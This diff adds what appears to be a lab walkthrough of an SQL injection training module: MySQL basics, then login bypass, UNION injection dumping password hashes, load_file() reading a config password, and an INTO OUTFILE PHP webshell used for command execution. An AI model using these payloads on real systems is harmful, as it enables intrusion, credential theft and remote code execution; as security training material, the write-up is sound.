@@ -1,0 +1,616 @@
+[Intro to MySQL]
+
+[*] Target: 178.62.74.235:31455
+
+[*] Authenticate to 178.62.74.235 with user "root" and password "password"
+
+[Question 1] Connect to the database using the MySQL client from the command line. Use the 'show databases;' command to list databases in the DBMS. What is the name of the first database?
+
+    # mysql -h 178.62.74.235 -P 31455 -u root -p
+        
+        Enter password: <Enter "password">
+
+        MariaDB [(none)]> show databases;
+        +--------------------+
+        | Database           |
+        +--------------------+
+        | employees          |
+        | information_schema |
+        | mysql              |
+        | performance_schema |
+        | sys                |
+        +--------------------+
+        5 rows in set (0.223 sec)
+
+    [!] Answer: "employees"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[SQL Statements]
+
+[*] Target: 178.62.74.235:32261
+
+[*] Authenticate to 178.62.74.235 with user "root" and password "password"
+
+[Question 1] What is the department number for the 'Development' department?
+
+    # mysql -u root -h 178.62.74.235 -P 32261 -p
+
+        Enter password: <Enter "password">
+
+        MariaDB [(none)]> show databases;
+
+            +--------------------+
+            | Database           |
+            +--------------------+
+            | employees          |
+            | information_schema |
+            | mysql              |
+            | performance_schema |
+            | sys                |
+            +--------------------+
+            5 rows in set (0.213 sec)
+
+        MariaDB [(none)]> use employees
+            
+            Reading table information for completion of table and column names
+            You can turn off this feature to get a quicker startup with -A
+
+            Database changed
+
+        MariaDB [employees]> show tables;
+
+            +----------------------+
+            | Tables_in_employees  |
+            +----------------------+
+            | current_dept_emp     |
+            | departments          |
+            | dept_emp             |
+            | dept_emp_latest_date |
+            | dept_manager         |
+            | employees            |
+            | salaries             |
+            | titles               |
+            +----------------------+
+            8 rows in set (0.250 sec)
+
+        MariaDB [employees]> select * from departments;
+
+            +---------+--------------------+
+            | dept_no | dept_name          |
+            +---------+--------------------+
+            | d009    | Customer Service   |
+            | d005    | Development        |
+            | d002    | Finance            |
+            | d003    | Human Resources    |
+            | d001    | Marketing          |
+            | d004    | Production         |
+            | d006    | Quality Management |
+            | d008    | Research           |
+            | d007    | Sales              |
+            +---------+--------------------+
+            9 rows in set (4.928 sec)
+
+    [!] Answer: "d005"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Query Results]
+
+[*] Target: 134.122.101.249:30112
+
+[*] Authenticate to 134.122.101.249 with user "root" and password "password"
+
+[Question 1]  What is the last name of the employee whose first name starts with "Bar" AND who was hired on 1990-01-01?
+
+    # mysql -u root -h 134.122.101.249 -P 30112 -p
+
+        Enter password: <Enter "password">
+
+        MariaDB [(none)]> show databases;
+          
+            +--------------------+
+            | Database           |
+            +--------------------+
+            | employees          |
+            | information_schema |
+            | mysql              |
+            | performance_schema |
+            | sys                |
+            +--------------------+
+            5 rows in set (0.234 sec)
+
+        MariaDB [(none)]> use employees;
+        
+            Reading table information for completion of table and column names
+            You can turn off this feature to get a quicker startup with -A
+
+            Database changed
+        
+        MariaDB [employees]> describe employees;
+
+            +------------+---------------+------+-----+---------+-------+
+            | Field      | Type          | Null | Key | Default | Extra |
+            +------------+---------------+------+-----+---------+-------+
+            | emp_no     | int(11)       | NO   | PRI | NULL    |       |
+            | birth_date | date          | NO   |     | NULL    |       |
+            | first_name | varchar(14)   | NO   |     | NULL    |       |
+            | last_name  | varchar(16)   | NO   |     | NULL    |       |
+            | gender     | enum('M','F') | NO   |     | NULL    |       |
+            | hire_date  | date          | NO   |     | NULL    |       |
+            +------------+---------------+------+-----+---------+-------+
+            6 rows in set (0.228 sec)
+
+        MariaDB [employees]> select * from employees where first_name like "Bar%" and hire_date = "1990-01-01";
+
+            +--------+------------+------------+-----------+--------+------------+
+            | emp_no | birth_date | first_name | last_name | gender | hire_date  |
+            +--------+------------+------------+-----------+--------+------------+
+            |  10227 | 1953-10-09 | Barton     | Mitchem   | M      | 1990-01-01 |
+            +--------+------------+------------+-----------+--------+------------+
+            1 row in set (0.228 sec)
+
+    [!] Answer: "Mitchem"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[SQL Operators]
+
+[*] Target: 165.227.237.211:31444
+
+[*] Authenticate to 165.227.237.211 with user "root" and password "password"
+
+[Question 1] In the 'titles' table, what is the number of records WHERE the employee number is greater than 10000 OR their title does NOT contain 'engineer'?
+
+    # mysql -u root -h 165.227.237.211 -P 31444 -p
+
+        Enter password: <Enter "password">
+
+        MariaDB [(none)]> show databases;
+
+            +--------------------+
+            | Database           |
+            +--------------------+
+            | employees          |
+            | information_schema |
+            | mysql              |
+            | performance_schema |
+            | sys                |
+            +--------------------+
+            5 rows in set (0.208 sec)
+
+        MariaDB [(none)]> use employees;
+
+            Reading table information for completion of table and column names
+            You can turn off this feature to get a quicker startup with -A
+
+            Database changed
+
+        MariaDB [employees]> show tables;
+
+            +----------------------+
+            | Tables_in_employees  |
+            +----------------------+
+            | current_dept_emp     |
+            | departments          |
+            | dept_emp             |
+            | dept_emp_latest_date |
+            | dept_manager         |
+            | employees            |
+            | salaries             |
+            | titles               |
+            +----------------------+
+            8 rows in set (0.201 sec)
+
+        MariaDB [employees]> describe titles;
+
+            +-----------+-------------+------+-----+---------+-------+
+            | Field     | Type        | Null | Key | Default | Extra |
+            +-----------+-------------+------+-----+---------+-------+
+            | emp_no    | int(11)     | NO   | PRI | NULL    |       |
+            | title     | varchar(50) | NO   | PRI | NULL    |       |
+            | from_date | date        | NO   | PRI | NULL    |       |
+            | to_date   | date        | YES  |     | NULL    |       |
+            +-----------+-------------+------+-----+---------+-------+
+            4 rows in set (0.202 sec)
+
+        MariaDB [employees]> select * from titles where emp_no > 10000 || title not like "%engineer%";
+
+            +--------+--------------------+------------+------------+
+            | emp_no | title              | from_date  | to_date    |
+            +--------+--------------------+------------+------------+
+            |  10001 | Senior Engineer    | 1986-06-26 | 9999-01-01 |
+            |  10002 | Senior Engineer    | 1995-12-03 | 9999-01-01 |
+            |  10003 | Engineer           | 1986-12-01 | 1995-12-01 |
+            |  10004 | Senior Engineer    | 1995-12-01 | 9999-01-01 |
+            |  10005 | Senior Staff       | 1996-09-12 | 9999-01-01 |
+
+                                     ...
+
+            |  10650 | Engineer           | 1996-12-25 | 9999-01-01 |
+            |  10651 | Assistant Engineer | 1988-12-29 | 1997-12-29 |
+            |  10652 | Engineer           | 1997-12-29 | 2000-11-15 |
+            |  10653 | Senior Staff       | 2000-03-12 | 9999-01-01 |
+            |  10654 | Staff              | 1992-03-12 | 2000-03-12 |
+            +--------+--------------------+------------+------------+
+            654 rows in set (0.406 sec)
+
+    [!] Answer: "654"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Subverting Query Logic]
+
+[*] Target: 134.122.101.249:30756
+
+[Question 1] Try to log in as the user 'tom'. What is the flag value shown after you successfully log in?
+
+    -   After I went to http://134.122.101.249:30756/ then entered Username: tom & Password: 123 
+
+    =>    Executing query: SELECT * FROM logins WHERE username='tom' AND password = '123';
+
+    -   So if I want to login as "tom" I need to bypass the password condition. You just need to turn the password condition into a comment
+
+        Executing query: SELECT * FROM logins WHERE username='tom';#' AND password = '123';  <=> Username: tom';# & Password: 123
+
+        => "... 202a1d1a8b195d5e9a57e434cc16000c ..."
+
+    (Note: I know, I know! This question wants you to use subverting query logic but nah! Think outside the box)
+
+    [Funfact] SELECT * FROM logins WHERE username='tom' AND password = '123' OR '555'='555';#
+
+              - The condition '555'='555' is always true. However, due to the order of evaluation, the OR operator has higher precedence than the AND operator. 
+              
+              => So, the condition becomes (username='tom' AND password='123') OR ('555'='555'). 
+              
+              => Since '555'='555' is true and it is combined with the OR operator, the overall condition becomes true, regardless of the username and password. 
+              
+              => This is why it allows the login as "admin" because the condition is satisfied without requiring a correct username and password.
+
+    [!] Answer: "202a1d1a8b195d5e9a57e434cc16000c"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Using Comments]
+
+[*] Target: 134.122.101.249:31485
+
+[Question 1]  Login as the user with the id 5 to get the flag.
+
+    -   After I went to http://134.122.101.249:31485/ then entered Username: hungthinhtran & Password: bigbox
+
+    => Executing query: SELECT * FROM logins WHERE (username='hungthinhtran' AND id > 1) AND password = '679a67e6a1a3be699242537ce15eec1d';
+
+        [?] 679a67e6a1a3be699242537ce15eec1d - bigbox - Possible algorithms: MD5
+
+    -   In this case, I need a condition like (Username: 'random') OR (id: 5) then turn the rest into the comment
+
+    => Executing query: SELECT * FROM logins WHERE (username='hungthinhtran') OR (id = 5);#' AND id > 1) AND password = '679a67e6a1a3be699242537ce15eec1d';
+
+    <=> Username: hungthinhtran') OR (id = 5);# & Password: bigbox => "... cdad9ecdf6f14b45ff5c4de32909caec ..."
+
+    [!] Answer: "cdad9ecdf6f14b45ff5c4de32909caec"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Union Clause]
+
+[*] Target: 159.65.48.156:30254
+
+[*] Authenticate to 159.65.48.156 with user "root" and password "password"
+
+[Question 1] Connect to the above MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table.
+
+    # mysql -h 159.65.48.156 -P 30254 -u root -p
+
+        Enter password: <Enter "password">
+
+        MariaDB [(none)]> show databases;
+
+            +--------------------+
+            | Database           |
+            +--------------------+
+            | employees          |
+            | information_schema |
+            | mysql              |
+            | performance_schema |
+            | sys                |
+            +--------------------+
+            5 rows in set (0.203 sec)
+
+        MariaDB [(none)]> use employees;
+
+            Reading table information for completion of table and column names
+            You can turn off this feature to get a quicker startup with -A
+
+            Database changed
+
+        MariaDB [employees]> show tables;
+
+            +----------------------+
+            | Tables_in_employees  |
+            +----------------------+
+            | current_dept_emp     |
+            | departments          |
+            | dept_emp             |
+            | dept_emp_latest_date |
+            | dept_manager         |
+            | employees            |
+            | salaries             |
+            | titles               |
+            +----------------------+
+            8 rows in set (0.202 sec)
+
+        MariaDB [employees]> describe employees;
+
+            +------------+---------------+------+-----+---------+-------+
+            | Field      | Type          | Null | Key | Default | Extra |
+            +------------+---------------+------+-----+---------+-------+
+            | emp_no     | int(11)       | NO   | PRI | NULL    |       |
+            | birth_date | date          | NO   |     | NULL    |       |
+            | first_name | varchar(14)   | NO   |     | NULL    |       |
+            | last_name  | varchar(16)   | NO   |     | NULL    |       |
+            | gender     | enum('M','F') | NO   |     | NULL    |       |
+            | hire_date  | date          | NO   |     | NULL    |       |
+            +------------+---------------+------+-----+---------+-------+
+            6 rows in set (0.205 sec)
+
+        MariaDB [employees]> describe departments;
+
+            +-----------+-------------+------+-----+---------+-------+
+            | Field     | Type        | Null | Key | Default | Extra |
+            +-----------+-------------+------+-----+---------+-------+
+            | dept_no   | char(4)     | NO   | PRI | NULL    |       |
+            | dept_name | varchar(40) | NO   | UNI | NULL    |       |
+            +-----------+-------------+------+-----+---------+-------+
+            2 rows in set (0.202 sec)
+
+        MariaDB [employees]> select emp_no, first_name from employees union select * from departments;
+
+            +--------+--------------------+
+            | emp_no | first_name         |
+            +--------+--------------------+
+            | 10001  | Georgi             |
+            | 10002  | Vivian             |
+            | 10003  | Temple             |
+            | 10004  | Masanao            |
+            | 10005  | Sanjay             |
+            | 10006  | Marie              |
+
+                        ...
+
+            | 10652  | Berhard            |
+            | 10653  | Patricia           |
+            | 10654  | Sachin             |
+            | d009   | Customer Service   |
+            | d005   | Development        |
+            | d002   | Finance            |
+            | d003   | Human Resources    |
+            | d001   | Marketing          |
+            | d004   | Production         |
+            | d006   | Quality Management |
+            | d008   | Research           |
+            | d007   | Sales              |
+            +--------+--------------------+
+            663 rows in set (0.201 sec)
+
+    [!] Answer: "663"   
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Union Injection]
+
+[*] Target: 134.122.101.249:30923 
+
+[Question 1] Use a Union injection to get the result of 'user()'
+
+    -   In this case, we don't have to union this table to any other table just need to gather information about the username and hostname of the current MySQL user account
+
+    [Example] So when you entered the port number "1" => select * from port_information_example where port = '1';
+
+            Now we need to know the number of port_information_example 's columns => Try to guess, and in this case, it has 4 columns
+
+            => select * from port_information_example where port = '1' union select null,null,null,user();#;
+
+            <=> Port: 1' union select null,null,null,user();#
+
+            => "... root@localhost ..."
+
+    [!] Answer: "root@localhost"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Database Enumeration]
+
+[*] Target: 206.189.19.225:30941
+
+[Question 1] What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?
+
+[Example] So when you entered the port nunber "1" => select * from port_information_example where port = '1';
+
+    [Step 1] Find the current database name 
+
+             select * from port_information_example where port = '1' union select null,null,null,database();#';
+
+             <=> Port: 1' union select null,null,null,null;#
+
+             => "... ilfreight ..."
+
+    [Step 2] Collect all tables in the "ilfreight" databases
+
+             select * from port_information_example where port = '1' union select null, null, null, table_name from information_schema.tables where table_schema = 'ilfreight';#
+
+             <=> Port: 1' union select null, null, null, table_name from information_schema.tables where table_schema='ilfreight';#
+
+                => 	[+] ports
+                    
+                    [+] products
+                    
+                    [+] users
+
+    [Step 3] Look for all column names in "users" table
+            
+             select * from port_information_example where port = '1' union select null,null,null,column_name from information_schema.columns where table_name = 'users';#
+             
+             <=> Port: 1' union select null,null,null,column_name from information_schema.columns where table_name = 'users';#
+
+                => [+] username
+
+                   [+] password
+
+                   [+] id 
+
+    [Step 4] Gather information about all usernames and password in the "users" table in ilfreight database
+
+             select * from port_information_example where port = '1' union select null,id,username,password from users;#
+
+             (Note: This time, you are searching for the information in a table, not its name in information_schema so just select the column and read it normally)
+
+             <=> Port: 1' union select null,id,username,password from users;#
+
+                => [+] admin: 392037dbba51f692776d6cefb6dd546d
+
+                   [+] newuser: 9da2c9bcdf39d8610954e0e11ea8f45f
+
+    [!] Answer: "9da2c9bcdf39d8610954e0e11ea8f45f"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Reading Files]
+
+[*] Target: 206.189.19.225:30685
+
+[*] PHP code: https://academy.hackthebox.com/storage/modules/33/load_file_source.png
+
+[Question 1] We see in the above PHP code that '$conn' is not defined, so it must be imported using the PHP include command. Check the imported page to obtain the database password.
+
+    In this case, I think $conn is defined in another part, we must read all the code of search.php to find out
+
+    [Example] So when you entered the port number "1" => select * from port_information_example where port = '1';
+
+        select * from port_information_example where port = '1' union select null,null,null,load_file("/var/www/html/search.php");#;
+
+    => [+] ".$row[1]." : <?php include "config.php"; ?>
+
+       [+] ".$row[2]." : <?php
+                        if (isset($_GET["port_code"])) {
+                        $q = "Select * from ports where code like '%".$_GET["port_code"]."%'";
+
+                        $result = mysqli_query($conn,$q);
+                        if (!$result){
+                                die("</table></div><p style='font-size: 15px'>".mysqli_error($conn)."</p>");}
+                        while($row = mysqli_fetch_array($result)){
+                        echo "<tr><td style=\"width:400px\" colspan=3>".$row[1]."</td><td style=\"width:400px\" colspan=3>".$row[2]."</td><td style=\"width:450px\" colspan=3>".$row[3]."</tr>";}
+                        }?>
+
+    => That's all I got, but now we know that search.php is related with config.php
+
+        select * from port_information_example where port = '1' union select null,null,null,load_file("/var/www/html/config.php");#; => "... 'DB_PASSWORD'=>'dB_pAssw0rd_iS_flag!', ..."
+
+    [!] Answer: "dB_pAssw0rd_iS_flag!"
+ 
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Writing Files]
+
+[*] Target: 159.65.48.156:31823
+
+[Question 1] Find the flag by using a webshell.
+
+    [Example] So when you entered the port number "1" => select * from port_information_example where port = '1';
+
+        select * from port_information_example where port = '1' union select null,null,null,'<?php system($_REQUEST[101]); ?>' into outfile '/var/www/html/malware.php';#;
+
+    -   Oke! Now we have malware.php in the /var/www/html
+
+        => http://159.65.48.156:31823/malware.php?101=pwd => "... /var/www/html" 
+
+        => http://159.65.48.156:31823/malware.php?101=find%20/%20-type%20f%20-name%20"*flag*"%202>/dev/null => "... /var/www/flag.txt ..."
+
+        => http://159.65.48.156:31823/malware.php?101=cat%20/var/www/flag.txt => "... d2b5b27ae688b6a0f1d21b7d3a0798cd"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Skills Assessment - SQL Injection Fundamentals]
+
+[*] Target: 206.189.19.225:31414
+
+[Question 1] Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.
+
+    [Mindset] In this case, we don't even know the username and we need to read a file in /root folder =)) so the we have to login with the highest privilege using the "pure True" condition in SQL
+
+    -   Go to the http://206.189.19.225:31414 => a login from
+
+    [1st Try] Oke so in the "Subverting Query Logic" section, I told you guys "OR operator has higher precedence than the AND operator" right =))
+
+        [Imagine database]  SELECT * FROM logins WHERE (username='hungthinhtran') AND password = 'bigbox';
+
+            Username: hungthinhtran
+
+            Password: bigbox' OR 'hunter'='hunter';#
+
+            => Fail
+
+    [2nd Try] Nah! Maybe the password is encoded in the database, let's try with the username
+
+        [Imagine database]  SELECT * FROM logins WHERE (username='hungthinhtran') AND password = '679a67e6a1a3be699242537ce15eec1d';
+
+            Username: hungthinhtran') OR ('bigbox'='bigbox');#
+
+            Password: bigbox
+
+            => Fail
+
+    [3rd Try] Oke, I think I just need to keep it simple and imagine a basic backend
+
+        [Imagine database]  SELECT * FROM logins WHERE username='hungthinhtran' AND password = '679a67e6a1a3be699242537ce15eec1d';
+
+            Username: hungthinhtran' OR 'bigbox'='bigbox';#
+
+            Password: bigbox
+
+            => Success 
+
+    -   After login, I see the search bar and http://206.189.19.225:31414/dashboard/dashboard.php
+
+    -   It's testing time (~.~!)
+
+        THINH' UNION SELECT SLEEP(5);#
+        THINH' UNION SELECT SLEEP(5),NULL;#
+        THINH' UNION SELECT SLEEP(5),NULL,NULL;#
+        THINH' UNION SELECT SLEEP(5),NULL,NULL,NULL;#
+        THINH' UNION SELECT SLEEP(5),NULL,NULL,NULL,NULL;# => Great! there are 5 column in this table
+
+        (Note: I just found that this isn't a blind SQL lab =)) sorry )
+
+    - To know to flag in the /root folder, I need to upload malware.php (like the previous question)
+
+        THINH' union select null,null,null,null,'<?php system($_REQUEST[101]); ?>' into outfile '/var/www/html/dashboard/malware.php';#
+
+        => http://206.189.19.225:31414/dashboard/malware.php?101=find%20/%20-name%20%22*flag*%22 => "... /flag_cae1dadcd174.txt ..."
+
+        => http://206.189.19.225:31414/dashboard/malware.php?101=cat%20/flag_cae1dadcd174.txt => "528d6d9cedc2c7aab146ef226e918396"
+
+    [!] Answer: "528d6d9cedc2c7aab146ef226e918396"
